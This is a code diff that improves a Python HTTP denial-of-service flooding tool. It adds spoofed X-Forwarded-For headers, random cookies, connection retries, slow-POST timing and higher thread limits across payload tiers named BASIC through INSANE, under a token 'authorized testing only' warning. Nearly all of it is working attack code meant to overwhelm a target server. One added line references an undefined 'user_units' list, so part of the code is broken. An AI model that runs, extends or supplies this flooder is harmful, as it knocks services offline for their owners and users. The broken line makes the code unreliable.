@@ -24,6 +24,7 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 stop_attack = threading.Event()
 success_count = 0  # Track successful connections
 total_bytes_sent = 0  # Track total bytes sent
+failed_count = 0  # Track failed connections
 
 # Clear screen
 def clear_text():
@@ -37,6 +38,10 @@ def generate_url_path(length):
 # Generate random payload
 def generate_payload(size):
     return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))
+
+# Generate random cookie
+def generate_cookie():
+    return f"session={random.randint(100000, 999999)}; id={generate_url_path(10)}"
 
 # Comprehensive lists for realistic headers
 user_agents = [
@@ -57,89 +62,106 @@ referers = [
 ]
 accept_languages = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "id-ID,id;q=0.9"]
 cache_controls = ["no-cache", "max-age=0", "no-store"]
+x_forwarded_for = [f"192.168.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(10)]
 
 # Attack logic
 def DoS_Attack(ip, host, port, type_attack, booster_sent, data_type_loader_packet, use_ssl=False):
-    global success_count, total_bytes_sent
+    global success_count, total_bytes_sent, failed_count
     if stop_attack.is_set():
         return
     url_path = generate_url_path(10)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(5)  # Blocking socket with 5s timeout
+    s.settimeout(10)  # Increased timeout to 10s
     if use_ssl:
         context = ssl.create_default_context()
         s = context.wrap_socket(s, server_hostname=host)
-    try:
-        # Payload levels
-        payload_patterns = {
-            'BASIC': f"{type_attack} /{url_path}?q={generate_url_path(5)} HTTP/1.1\n"
-                     f"Host: {host}\n"
-                     f"Connection: keep-alive\n"
-                     f"User-Agent: {random.choice(user_agents)}\n"
-                     f"Accept: {random.choice(accepts)}\n"
-                     f"Referer: {random.choice(referers)}\n"
-                     f"Accept-Language: {random.choice(accept_languages)}\n"
-                     f"Cache-Control: {random.choice(cache_controls)}\n\n",
-            'MEDIUM': f"POST /{url_path}?q={generate_url_path(5)} HTTP/1.1\n"
-                      f"Host: {host}\n"
-                      f"Connection: keep-alive\n"
-                      f"User-Agent: {random.choice(user_agents)}\n"
-                      f"Accept: {random.choice(accepts)}\n"
-                      f"Referer: {random.choice(referers)}\n"
-                      f"Accept-Language: {random.choice(accept_languages)}\n"
-                      f"Cache-Control: {random.choice(cache_controls)}\n"
-                      f"Content-Type: application/x-www-form-urlencoded\n"
-                      f"Content-Length: 1024\n\n"
-                      f"data={generate_payload(1024)}",
-            'HEAVY': f"POST /{url_path}?q={generate_url_path(10)} HTTP/1.1\n"
-                     f"Host: {host}\n"
-                     f"Connection: keep-alive\n"
-                     f"User-Agent: {random.choice(user_agents)}\n"
-                     f"Accept: {random.choice(accepts)}\n"
-                     f"Referer: {random.choice(referers)}\n"
-                     f"Accept-Language: {random.choice(accept_languages)}\n"
-                     f"Cache-Control: {random.choice(cache_controls)}\n"
-                     f"Content-Type: application/json\n"
-                     f"Content-Length: 51200\n\n"
-                     f"{generate_payload(51200)}",
-            'INSANE': f"POST /{url_path}?q={generate_url_path(15)} HTTP/1.1\n"
-                      f"Host: {host}\n"
-                      f"Connection: keep-alive\n"
-                      f"User-Agent: {random.choice(user_agents)}\n"
-                      f"Accept: {random.choice(accepts)}\n"
-                      f"Referer: {random.choice(referers)}\n"
-                      f"Accept-Language: {random.choice(accept_languages)}\n"
-                      f"Cache-Control: {random.choice(cache_controls)}\n"
-                      f"Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{random.randint(1000000000, 9999999999)}\n"
-                      f"Content-Length: 102400\n\n"
-                      f"------WebKitFormBoundary{random.randint(1000000000, 9999999999)}\n"
-                      f"Content-Disposition: form-data; name=\"file\"; filename=\"test{random.randint(1, 1000)}.txt\"\n"
-                      f"Content-Type: text/plain\n\n"
-                      f"{generate_payload(102400)}\n"
-                      f"------WebKitFormBoundary{random.randint(1000000000, 9999999999)}--\n"
-        }
-        packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['BASIC']).encode()
-        s.connect((ip, port))
-        sent_bytes = 0
-        for _ in range(booster_sent):
-            if stop_attack.is_set():
-                break
-            s.sendall(packet_data)
-            sent_bytes += len(packet_data)
-            # Simulate slow attack for MEDIUM level
-            if data_type_loader_packet == 'MEDIUM':
-                time.sleep(0.1)  # Slow down to keep connections open
-        success_count += 1
-        total_bytes_sent += sent_bytes
-        logging.info(f"Successful connection: Sent {sent_bytes} bytes to {ip}:{port} with {data_type_loader_packet}")
-    except (ConnectionError, TimeoutError, socket.gaierror, ssl.SSLError) as e:
-        logging.error(f"Attack error on {ip}:{port}: {type(e).__name__} - {str(e)}")
-    finally:
-        s.close()
+    retries = 3  # Retry up to 3 times on failure
+    for attempt in range(retries):
+        try:
+            # Payload levels
+            payload_patterns = {
+                'BASIC': f"{type_attack} /{url_path}?q={generate_url_path(5)} HTTP/1.1\n"
+                         f"Host: {host}\n"
+                         f"Connection: keep-alive\n"
+                         f"User-Agent: {random.choice(user_agents)}\n"
+                         f"Accept: {random.choice(accepts)}\n"
+                         f"Referer: {random.choice(referers)}\n"
+                         f"Accept-Language: {random.choice(accept_languages)}\n"
+                         f"Cache-Control: {random.choice(cache_controls)}\n"
+                         f"Cookie: {generate_cookie()}\n"
+                         f"X-Forwarded-For: {random.choice(x_forwarded_for)}\n\n",
+                'MEDIUM': f"POST /{url_path}?q={generate_url_path(5)} HTTP/1.1\n"
+                          f"Host: {host}\n"
+                          f"Connection: keep-alive\n"
+                          f"User-Agent: {random.choice(user_units)}\n"
+                          f"Accept: {random.choice(accepts)}\n"
+                          f"Referer: {random.choice(referers)}\n"
+                          f"Accept-Language: {random.choice(accept_languages)}\n"
+                          f"Cache-Control: {random.choice(cache_controls)}\n"
+                          f"Content-Type: application/x-www-form-urlencoded\n"
+                          f"Content-Length: 1024\n"
+                          f"Cookie: {generate_cookie()}\n"
+                          f"X-Forwarded-For: {random.choice(x_forwarded_for)}\n\n"
+                          f"data={generate_payload(1024)}",
+                'HEAVY': f"POST /{url_path}?q={generate_url_path(10)} HTTP/1.1\n"
+                         f"Host: {host}\n"
+                         f"Connection: keep-alive\n"
+                         f"User-Agent: {random.choice(user_agents)}\n"
+                         f"Accept: {random.choice(accepts)}\n"
+                         f"Referer: {random.choice(referers)}\n"
+                         f"Accept-Language: {random.choice(accept_languages)}\n"
+                         f"Cache-Control: {random.choice(cache_controls)}\n"
+                         f"Content-Type: application/json\n"
+                         f"Content-Length: 51200\n"
+                         f"Cookie: {generate_cookie()}\n"
+                         f"X-Forwarded-For: {random.choice(x_forwarded_for)}\n\n"
+                         f"{generate_payload(51200)}",
+                'INSANE': f"POST /{url_path}?q={generate_url_path(15)} HTTP/1.1\n"
+                          f"Host: {host}\n"
+                          f"Connection: {'close' if random.random() > 0.5 else 'keep-alive'}\n"
+                          f"User-Agent: {random.choice(user_agents)}\n"
+                          f"Accept: {random.choice(accepts)}\n"
+                          f"Referer: {random.choice(referers)}\n"
+                          f"Accept-Language: {random.choice(accept_languages)}\n"
+                          f"Cache-Control: {random.choice(cache_controls)}\n"
+                          f"Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{random.randint(1000000000, 9999999999)}\n"
+                          f"Content-Length: 102400\n"
+                          f"Cookie: {generate_cookie()}\n"
+                          f"X-Forwarded-For: {random.choice(x_forwarded_for)}\n\n"
+                          f"------WebKitFormBoundary{random.randint(1000000000, 9999999999)}\n"
+                          f"Content-Disposition: form-data; name=\"file\"; filename=\"test{random.randint(1, 1000)}.txt\"\n"
+                          f"Content-Type: text/plain\n\n"
+                          f"{generate_payload(102400)}\n"
+                          f"------WebKitFormBoundary{random.randint(1000000000, 9999999999)}--\n"
+            }
+            packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['BASIC']).encode()
+            s.connect((ip, port))
+            sent_bytes = 0
+            for _ in range(booster_sent):
+                if stop_attack.is_set():
+                    break
+                s.sendall(packet_data)
+                sent_bytes += len(packet_data)
+                # Simulate slow attack for MEDIUM and partial INSANE
+                if data_type_loader_packet == 'MEDIUM' or (data_type_loader_packet == 'INSANE' and random.random() > 0.7):
+                    time.sleep(random.uniform(0.05, 0.2))
+            success_count += 1
+            total_bytes_sent += sent_bytes
+            logging.info(f"Successful connection: Sent {sent_bytes} bytes to {ip}:{port} with {data_type_loader_packet}")
+            break  # Exit retry loop on success
+        except (ConnectionError, TimeoutError, socket.gaierror, ssl.SSLError) as e:
+            failed_count += 1
+            logging.error(f"Attempt {attempt + 1}/{retries} failed on {ip}:{port}: {type(e).__name__} - {str(e)}")
+            if attempt < retries - 1:
+                time.sleep(1)  # Wait before retry
+            else:
+                logging.error(f"All retries failed for {ip}:{port}")
+        finally:
+            s.close()
 
 # Running attack with ThreadPoolExecutor
 def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booster_sent, data_type_loader_packet, use_ssl):
-    max_workers = min(spam_loader, 50 if data_type_loader_packet == 'BASIC' else 100 if data_type_loader_packet == 'MEDIUM' else 200 if data_type_loader_packet == 'HEAVY' else 500)
+    max_workers = min(spam_loader, 50 if data_type_loader_packet == 'BASIC' else 100 if data_type_loader_packet == 'MEDIUM' else 200 if data_type_loader_packet == 'HEAVY' else 200)
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
         while time.time() < time_loader and not stop_attack.is_set():
             futures = [executor.submit(DoS_Attack, ip, host, port_loader, methods_loader, booster_sent, data_type_loader_packet, use_ssl) for _ in range(spam_loader)]
@@ -148,13 +170,13 @@ def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loade
 
 # Countdown + interrupt
 def countdown_timer(time_loader):
-    global total_bytes_sent
+    global total_bytes_sent, success_count, failed_count
     start_time = time.time()
     remaining = int(time_loader - time.time())
     while remaining > 0 and not stop_attack.is_set():
         elapsed = time.time() - start_time
         traffic_kbps = (total_bytes_sent / 1024 / max(elapsed, 1)) if total_bytes_sent > 0 else 0
-        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds | Successful connections: {success_count} | Traffic: {traffic_kbps:.2f} KB/s{Fore.RESET}")
+        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds | Successful connections: {success_count} | Failed: {failed_count} | Traffic: {traffic_kbps:.2f} KB/s{Fore.RESET}")
         sys.stdout.flush()
         if sys.stdin in select.select([sys.stdin], [], [], 1)[0]:
             _ = sys.stdin.readline()
@@ -165,7 +187,7 @@ def countdown_timer(time_loader):
         remaining = int(time_loader - time.time())
     if not stop_attack.is_set():
         traffic_kbps = (total_bytes_sent / 1024 / max(elapsed, 1)) if total_bytes_sent > 0 else 0
-        print(f"\n{Fore.GREEN}Attack completed | Total successful connections: {success_count} | Total traffic: {total_bytes_sent / 1024:.2f} KB | Avg: {traffic_kbps:.2f} KB/s{Fore.RESET}")
+        print(f"\n{Fore.GREEN}Attack completed | Total successful connections: {success_count} | Failed: {failed_count} | Total traffic: {total_bytes_sent / 1024:.2f} KB | Avg: {traffic_kbps:.2f} KB/s{Fore.RESET}")
         stop_attack.set()
 
 # Exit confirmation
@@ -196,7 +218,7 @@ def validate_target(target):
 
 # Main command loop
 def command():
-    global stop_attack, success_count, total_bytes_sent
+    global stop_attack, success_count, total_bytes_sent, failed_count
     print(f"{Fore.RED}WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY. Unauthorized use is ILLEGAL and may result in severe legal consequences. Ensure you have explicit permission from the server owner before proceeding.{Fore.RESET}")
     print(f"{Fore.CYAN}Available payload types: BASIC (light), MEDIUM (slow POST), HEAVY (large POST), INSANE (extreme multi-vector){Fore.RESET}")
     while True:
@@ -226,15 +248,15 @@ def command():
                     time_loader = time.time() + int(args_get[4])
                     try:
                         spam_loader = int(args_get[5])
-                        if spam_loader > 500:
-                            print(f"{Fore.YELLOW}Warning: SPAM_THREAD > 500 may overload your system. Proceed with caution.{Fore.RESET}")
+                        if spam_loader > 1000:
+                            print(f"{Fore.YELLOW}Warning: SPAM_THREAD > 1000 may overload your system. Consider using a VPS.{Fore.RESET}")
                     except ValueError:
                         print(f"{Fore.RED}SPAM_THREAD must be a number{Fore.RESET}")
                         continue
                     try:
                         create_thread = int(args_get[6])
-                        if create_thread > 500:
-                            print(f"{Fore.YELLOW}Warning: CREATE_THREAD > 500 may overload your system. Proceed with caution.{Fore.RESET}")
+                        if create_thread > 1000:
+                            print(f"{Fore.YELLOW}Warning: CREATE_THREAD > 1000 may overload your system. Consider using a VPS.{Fore.RESET}")
                     except ValueError:
                         print(f"{Fore.RED}CREATE_THREAD must be a number{Fore.RESET}")
                         continue
@@ -249,8 +271,8 @@ def command():
                         continue
                     try:
                         spam_create_thread = int(args_get[9])
-                        if spam_create_thread > 500:
-                            print(f"{Fore.YELLOW}Warning: SPAM_CREATE > 500 may overload your system. Proceed with caution.{Fore.RESET}")
+                        if spam_create_thread > 1000:
+                            print(f"{Fore.YELLOW}Warning: SPAM_CREATE > 1000 may overload your system. Consider using a VPS.{Fore.RESET}")
                     except ValueError:
                         print(f"{Fore.RED}SPAM_CREATE must be a number{Fore.RESET}")
                         continue
@@ -263,6 +285,7 @@ def command():
                     stop_attack.clear()
                     success_count = 0
                     total_bytes_sent = 0
+                    failed_count = 0
                     print(f"{Fore.LIGHTCYAN_EX}Starting attack\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}\nProtocol: {'HTTPS' if use_ssl else 'HTTP'}\nThreads: {spam_loader}x{create_thread}x{spam_create_thread}\nMethod: {methods_loader}{Fore.RESET}")
 
                     for _ in range(create_thread):
